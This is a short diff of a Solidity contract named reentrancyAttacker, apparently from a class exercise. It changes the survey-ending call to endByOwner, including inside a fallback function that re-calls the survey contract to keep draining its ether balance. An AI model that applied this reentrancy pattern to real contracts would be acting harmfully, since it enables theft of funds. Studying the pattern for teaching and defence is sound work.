@@ -24,7 +24,7 @@ contract reentrancyAttacker {
         smartSurvey.vote("BlockChainClass", 0);
 
         //end it
-        smartSurvey.endNow(surveyName);
+        smartSurvey.endByOwner(surveyName);
         //return address(this).balance;
        
 
@@ -32,7 +32,7 @@ contract reentrancyAttacker {
     //fallback function tries to keep collecting reward from the bank
     fallback() external payable {
         if (address(smartSurvey).balance >= 1 ether) {
-            smartSurvey.endNow(surveyName);
+            smartSurvey.endByOwner(surveyName);
         }
     }
 }
